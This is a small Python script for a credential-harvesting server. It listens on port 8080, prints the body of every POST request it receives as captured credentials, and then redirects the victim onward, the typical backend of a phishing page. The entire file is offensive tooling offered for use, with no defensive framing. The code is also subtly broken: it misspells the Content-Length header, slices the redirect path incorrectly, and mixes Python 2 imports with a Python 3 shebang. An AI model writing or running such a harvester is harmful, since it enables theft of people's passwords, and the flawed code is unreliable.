#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Oct 13 16:17:55 2019

@author: max
"""

import SimpleHTTPServer
import SocketServer
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Contenr-Length'])
        creds = self.rfile.read(content_length).decode('UTF-8')
        print(creds)
        site = self.path[:1]
        self.send_response(301)
        self.send_header('Location',urllib.unquote(site))
        self.end_headers()
        
        
server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()